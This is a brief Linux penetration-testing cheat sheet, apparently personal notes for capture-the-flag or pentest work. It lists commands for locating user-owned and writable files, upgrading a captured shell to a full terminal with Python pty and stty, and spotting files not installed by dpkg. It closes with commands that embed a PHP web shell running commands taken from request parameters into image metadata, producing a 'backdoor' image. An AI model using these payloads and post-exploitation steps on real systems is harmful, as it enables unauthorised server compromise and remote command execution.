*CHEATSHEET*
**Linux**

Find user owned files
~~~
find / -user $(whoami) 2>/dev/null | egrep -v '(/proc)'
~~~

Find writeable files
~~~
find / -writeable 2>/dev/null | egrep -v '(/proc|/run|/dev)'
~~~

Upgrade shell with Python
~~~
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
F+G+ENTER
~~~

Find files that aren't installed by the system
~~~
for i in $(ls $(pwd)/*); do dpkg --search $i 1>/dev/null; done
~~~

Inject PHP into image
~~~
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
~~~